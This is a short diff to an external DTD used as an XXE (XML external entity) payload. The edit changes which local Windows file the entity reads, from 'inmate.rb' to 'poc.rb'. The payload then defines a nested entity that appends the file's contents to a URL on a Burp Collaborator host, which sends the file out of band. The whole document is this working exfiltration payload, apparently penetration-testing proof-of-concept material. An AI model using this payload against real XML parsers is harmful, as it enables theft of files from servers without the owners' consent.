@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///c:/inmate.rb">
+<!ENTITY % file SYSTEM "file:///c:/poc.rb">
         <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://9fptus1zo9rlnxquedox1dwnnet4ht.burpcollaborator.net/%file;'>">
         %eval;
         %exfiltrate;
